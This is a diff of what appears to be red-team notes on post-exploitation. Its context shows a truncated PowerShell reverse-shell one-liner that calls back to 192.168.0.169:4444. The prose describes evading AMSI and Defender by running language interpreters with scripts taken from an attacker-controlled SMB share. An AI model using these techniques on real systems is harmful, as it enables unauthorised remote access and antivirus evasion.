@@ -25,9 +25,9 @@ Post exploitation Techniques
 
 Lets say you have command execution on a host, your going to want to run a command to return a reverse shell. I would normally for something like `powershell -c "$client = New-Object System.Net.Sockets.TCPClient('192.168.0.169',4444);........" `
 
-Now with this aproach we have AMSI and Defender/AV. Running something like this without an AMSI bypass or obfuscation will get killed. Assuming our victim can reach out over SMB, we could either copy files over and execute or just execute an .exe straight from the share which is nothing new.
+Now with this aproach we have AMSI and Defender/AV. Running something like this without an AMSI bypass or obfuscation will get killed. Assuming our victim can reach out over SMB, typically we could either copy files over and execute them (which puts files on disk) or just execute an .exe straight from the share (which is nothing new)
 
-This approach does that but what we can do is call the .exe of our programming language of choice and also pass it a script, both of which are stored on our attacker controlled SMB share. Defender still scans the scripts but by utilising **Go, Java, PHP etc** we have more flexibility to bypass static signatures. Testing with random un-obfuscated reverse shell scripts in these languages has proved successful.
+This approach does the latter that but what we do is call the .exe of our programming language of choice and also pass it a script, both of which are stored on our attacker controlled SMB share. Defender still scans the scripts but by utilising **Go, Java, PHP etc** we have more flexibility to bypass static signatures. Testing with random un-obfuscated reverse shell scripts in these languages has proved successful.
 
 You can also utilise these programming languages to carry out post exploitation in weird and wonderful ways. You could even just call python.exe from the remote share and drop straight into the [Interpreter](#python-interpreter-example). 
 
